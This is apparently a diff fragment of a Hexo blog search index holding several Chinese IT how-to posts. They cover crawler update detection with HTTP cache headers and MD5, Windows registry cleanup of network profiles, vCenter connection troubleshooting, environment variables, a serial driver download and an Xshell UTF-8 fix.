+<p>在浏览器请求页面时，会把本地缓存的网页文件的最后修改时间放在请求头一起发送到服务器。服务器根据这个时间判断，如果页面有更新，会返回 HTTP 状态码 200，正常响应。如果页面没有更新，会返回 HTTP 状态码 304（不返回网页内容，只返回响应头）。</p>
+<p>那么作为爬虫，就可以模拟浏览器的这个行为，在本次爬取后记录爬取的时间，下一次爬取前在请求头中放入 <strong>If-Modified-Since</strong>，把上次爬取的时间一起发送给服务器，然后根据响应的 HTTP 状态码进行下一步操作。</p>
+<p>这种方法看似完美，但是很可惜，因为并不是所有服务器都会遵守规范返回 304 状态码。对于后端渲染的动态页面，或是前端渲染的单页面应用，这种方法也不合适。</p>
+<hr>
+<h3 id="Last-Modified-响应字段"><a href="#Last-Modified-响应字段" class="headerlink" title="Last-Modified 响应字段"></a>Last-Modified 响应字段</h3><p>根据 HTTP 规范，响应头中还有一个 <strong>Last-Modified</strong> 字段来返回页面最后一次的修改时间。<br>将这个时间与上一次爬取的时间做对比即可判断出页面是否更新。</p>
+<p>很可惜，这种方法基本只适用于静态页面。对于动态页面来说，返回的最后修改时间就是发回 Response 的时间，因为动态页面本来就是即时渲染的。</p>
+<hr>
+<h3 id="Etag-响应字段"><a href="#Etag-响应字段" class="headerlink" title="Etag 响应字段"></a>Etag 响应字段</h3><p><strong>Etag</strong> 主要为了解决前两个无法解决的一些问题而被创造出来的，例如：</p>
+<ul>
+<li>一些文件也许仅仅改变了修改时间，内容并没有改变</li>
+<li><strong>If-Modified-Since</strong> 的检查粒度是秒级的，无法做到更精确的检查</li>
+<li>服务器无法控制</li>
+</ul>
+<p>支持 <strong>Etag</strong> 的服务器会像返回 <strong>Last-Modified</strong> 那样返回一个<strong>Etag</strong> 字符串，客户端请求时根据需要在请求头的 <strong>If-Match</strong> 或 <strong>If-None-Match</strong>（更常用）字段中放入上次请求得来的 <strong>Etag</strong> 字符串，然后服务器会根据 <strong>Etag</strong> 作出与 <strong>If-Modified-Since</strong> 同样的响应。</p>
+<p>这种方法的最大问题就是服务器不一定支持。<strong>Etag</strong> 本身也是服务器根据一定规则计算出来的，有计算就有性能消耗，就看服务器愿不愿意支持了。</p>
+<hr>
+<h3 id="基于页面地址的比较"><a href="#基于页面地址的比较" class="headerlink" title="基于页面地址的比较"></a>基于页面地址的比较</h3><p>在本次爬取后，保存爬取的 URL，一段时间内爬过的就不用再爬了。如果页面 URL 中有诸如 ID 之类的参数的话，可以使用 ID，因为 ID 在后端中通常是唯一的。经常与 <strong>定时爬取</strong> 配合使用。</p>
+<hr>
+<h3 id="基于页面内容的比较"><a href="#基于页面内容的比较" class="headerlink" title="基于页面内容的比较"></a>基于页面内容的比较</h3><p>在本次爬取后，抽取页面关键元素的内容计算 MD5 并保存，下次爬取时比较 MD5 判断是否更新。如果关键内容不多的话，也可以不做 MD5 直接保存。</p>
+<p>不建议直接保存整个页面全部内容或其 MD5，因为如果页面中有 <em>本站已运行 xx 时间、访客：xx</em> 之类不断更新的内容，就会造成误判。</p>
+]]></content>
+      <tags>
+        <tag>爬虫</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows10 删除多余的网络配置项</title>
+    <url>/2017/03/24/win10-delete-network-config/</url>
+    <content><![CDATA[<p>1.Win + R 运行，输入 <strong>regedit</strong>，打开注册表编辑器<br>2.找到下面两个键</p>
+<blockquote>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Profiles</p>
+</blockquote>
+<blockquote>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\NetworkList\Signatures\Unmanaged</p>
+</blockquote>
+<p>3.在这两个键的下面有一堆 Hash 值命名的目录</p>
+<a id="more"></a>
+<p><img src="https://ooo.0o0.ooo/2017/03/24/58d476ba75381.png" alt="snipaste20170324_092802.png"></p>
+<p>不需要哪个删除就是了</p>
+<p>可以根据目录里面 <strong>ProfileName</strong> 的值来判断这个目录是属于哪个网络配置的<br><img src="https://ooo.0o0.ooo/2017/03/24/58d476ba4185f.png" alt="2.png"></p>
+<p>同样，如果需要修改网络配置的名字，也可以从这里修改 <strong>ProfileName</strong> 的值</p>
+<p>修改注册表有一定风险，请一定要仔细</p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vShere Client 无法连接 vCenter 故障排查思路</title>
+    <url>/2017/07/14/vsphere-server-problem-check/</url>
+    <content><![CDATA[<p>问题如图所示，vSphere Client 弹框无法连接到 vCenter，只提示出现未知错误<br><img src="https://ooo.0o0.ooo/2017/07/14/5968a5d706d37.jpg" alt></p>
+<p>这类问题一般不好排查，因为没有给出错误的具体信息，错误提示或者错误代码。我这里结合实例，总结一下该类问题的排查思路</p>
+<a id="more"></a>
+
+<p><strong>1. 检查网络连接情况；检查 vCenter 的 IP，用户名，密码是否正确</strong></p>
+<blockquote>
+<p>这个在大多数出现在实验环境中，生产环境中一般不会出现这种错误<br>解决办法也没什么好说的，ping 检查连接，用户名密码换成正确的</p>
+</blockquote>
+<p><strong>2. 检查 vCenter 的 Web Client 能否正常访问</strong></p>
+<blockquote>
+<p>vCenter 是可以从 Web 端访问管理的<br>URL 是：<a href="https://client-hostname:port/vsphere-client" target="_blank" rel="noopener">https://client-hostname:port/vsphere-client</a><br>默认情况下此端口为 9443，但可在 vSphere Web Client 安装过程中更改此端口</p>
+</blockquote>
+<p>这里打开并输入正确的用户名密码，发现可以正常访问，说明 vCenter 整个本身是没有什么问题的</p>
+<p><strong>3. 检查 VMware VirtualCenter Server 服务是否已经启动</strong></p>
+<blockquote>
+<p>VMware VirtualCenter Server 是 vCenter 的核心服务，无法连接的原因大部分是因为这个服务没有启动<br>使用 <strong>远程桌面</strong> 连接到 vCenter 所在的虚拟机，打开 <strong>服务器管理器 - 诊断 - 服务</strong>，找到这个服务，检查其状态</p>
+</blockquote>
+<p>我所在的环境是一个 vCenter 虚拟机通过 Platform Services Controller 去管理多个安装了 VMWare ESXi 底机。由于所在环境出于安全起见，在 vCenter Server 安装时禁止了 vCenter 虚拟机的远程桌面权限，所以这里采用另一种方式跳转上去</p>
+<p>由于 VMWare ESXi 底机是允许通过 vSphere Client 连接去管理单个的实体服务器的，而这种方式不需要依赖 VMware VirtualCenter Server 服务。所以我这里先连接 vCenter 虚拟机所在的那台实体服务器，再在其中打开控制台</p>
+<p>打开后检查，发现这个服务确实是没有正常启动<br><img src="https://i.loli.net/2017/07/14/5968b6b4dfdaf.png" alt="2.png"></p>
+<p><strong>4. VMware VirtualCenter Server 服务无法正常启动</strong></p>
+<blockquote>
+<p>一般来说，若是该服务没有启动，手动启用后便可恢复正常。但有些情况下无法手动启动，这时候就要结合具体情况来分析了<br>vCenter Server 的正常运行是需要依赖数据库的，所以先应该检查数据库的相关服务有没有正常运行<br>vCenter Server 在安装时是会将其核心服务设置为开机自启的。所以，如果在其启动时数据库服务没有正常运行，就会出现问题。我习惯的做法是将数据库相关服务的启动类型设置为 <strong>自动</strong>，而把 vCenter Server 相关服务设置为 <strong>自动（延迟启动）</strong>，来保证数据库服务优于 vCenter Server 服务启动。</p>
+</blockquote>
+<p><strong>5. VMware VirtualCenter Server 服务正常启动了还是不能连接</strong></p>
+<blockquote>
+<p>通常情况下，vCenter Server，vCenter 依赖的数据库和其他业务服务都是分开机器安装的，但也有安装在一台虚拟机中的情况<br>因为 vCenter Server 需要使用 80 端口，所以保证该端口的正常通信是必要的。可以使用 telnet 命令来检查端口是否已经开启，例如 telnet 10.100.100.14 80。如果不通，就要检查各防火墙的出入栈规则了<br>另外 Web 服务也会占用 80 端口来进行通信，这个也要仔细甄别</p>
+</blockquote>
+<p>关于 vCenter 服务的相关问题实在太多，这里只是整理了一些思路来帮助检查<br>对于这种问题没有什么好办法，就是查看日志来找问题原因。</p>
+]]></content>
+      <tags>
+        <tag>网络</tag>
+        <tag>vSphere</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows 环境变量的设置是否需要重启</title>
+    <url>/2016/12/25/windows-set-env-variable/</url>
+    <content><![CDATA[<p>最近从 Android Studio 导入一个项目，提示需要配置一个叫 ANDROID_SDK_HOME 的环境变量，然而 Google 的提示是建议我配置完之后重启，但是我实测配置之后没有重启也生效了，这是怎么回事呢？</p>
+<p>原来，环境变量就是属于 Windows 系统的一些预定义好的变量，其中分为用户变量和系统变量。用户变量只对当前设置环境变量的这个用户生效，系统变量则对整个系统生效。这些变量在用户登录时被设置，应用到系统里，对系统里运行的每一个程序都生效。</p>
+<p>在一个程序启动的时候，它所可以读取的环境变量就会被复制到它所在的环境中。也就是说，每个程序在运行时都会拥有原始环境变量的一份复制体，不会受其他程序的影响。</p>
+<p>所以结果就是，只要重新运行该程序，程序就会重新读取系统的环境变量，环境变量也就发生改变了。而如果修改的是系统要使用的环境变量，也就必须重启系统了。</p>
+]]></content>
+      <tags>
+        <tag>Windows</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Windows10 USB-To-Console 串口驱动 (x86 x64)</title>
+    <url>/2017/02/28/win10-usb-to-console/</url>
+    <content><![CDATA[<p>最近将 Win10 更新到 14393，之前的 USB 转串口线一插上就蓝屏重启，费了好多功夫 Google 到了之前版本的驱动，试了试居然没事了，这里就分享下吧</p>
+<p>下载地址：<a href="https://lanzous.com/iQxbyers9ha" target="_blank" rel="noopener">蓝奏云</a></p>
+<p>Step1. 进入 Step1 文件夹，安装 Setup.exe。如果成功，则无需进行第二步了。</p>
+<p>Step2. 进入 Step2 文件夹，安装 CH341SER.EXE。不行的话再安装 HL-340.EXE。</p>
+<p>Windows10 专业版 x64 测试通过。</p>
+]]></content>
+      <tags>
+        <tag>网络</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>解决 Xshell SSH 连接 Linux 中文乱码</title>
+    <url>/2017/04/29/xshell-ssh-chinaese-utf8/</url>
+    <content><![CDATA[<h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>首先需要确保你的 Xshell 的连接编码是 UTF-8。<br>虽然可以修改 Linux 端的字符集去迎合 Windows 端做到中文的正常显示，但在当前 I18N 的大环境下，还是尽量用 UTF-8 吧。</p>
+<p>打开 Xshell 的会话属性窗口，在左边选择到 <strong>终端</strong>，编码一项内，如果不是 Unicode 的话请改成 Unicode</p>
+<a id="more"></a>
+<p><img src="https://ooo.0o0.ooo/2017/04/15/58f1eda7c1d25.png" alt="1.png"></p>
+<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>不出意外的话，重新连接你的 SSH 应该已经能正常显示中文了，因为大部分 Linux 的默认连接编码就是 UTF-8 的。</p>
+<p>如果还是不能正常显示，你需要这样做<br>修改 <strong>/etc/profile</strong> 这个文件<br>在其中添加</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LC_ALL=<span class="string">"zh_CN.UTF-8"</span></span><br></pre></td></tr></table></figure>
+
+<p>这条命令的意思是设置 Locale 为 UTF-8，会在用户初始化时执行</p>
+<p>重启系统，这里中文已经能正常显示了<br><img src="https://ooo.0o0.ooo/2017/04/15/58f1eec23e82d.png" alt="2.png"></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
 </search>
